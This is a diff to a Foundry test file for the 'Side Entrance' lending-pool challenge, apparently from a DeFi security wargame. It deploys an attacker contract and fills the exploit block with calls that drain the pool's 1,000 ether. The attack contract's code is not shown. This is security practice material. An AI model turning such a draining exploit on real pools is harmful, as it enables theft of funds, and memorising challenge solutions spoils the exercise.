@@ -5,12 +5,14 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceAttack} from "../../../src/Contracts/attacker-contracts/SideEntranceAttack.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
+    SideEntranceAttack internal sideEntranceAttack;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
 
@@ -23,6 +25,11 @@ contract SideEntrance is Test {
         sideEntranceLenderPool = new SideEntranceLenderPool();
         vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");
 
+        sideEntranceAttack = new SideEntranceAttack(
+            address(sideEntranceLenderPool)
+        );
+        vm.label(address(sideEntranceAttack), "Side Entrance Attack");
+
         vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);
 
         assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);
@@ -34,6 +41,15 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        sideEntranceAttack.attack(ETHER_IN_POOL);
+        sideEntranceAttack.withdraw();
+
+        emit log_named_uint(
+            "contract balance ",
+            address(sideEntranceLenderPool).balance
+        );
 
         /** EXPLOIT END **/
         validation();
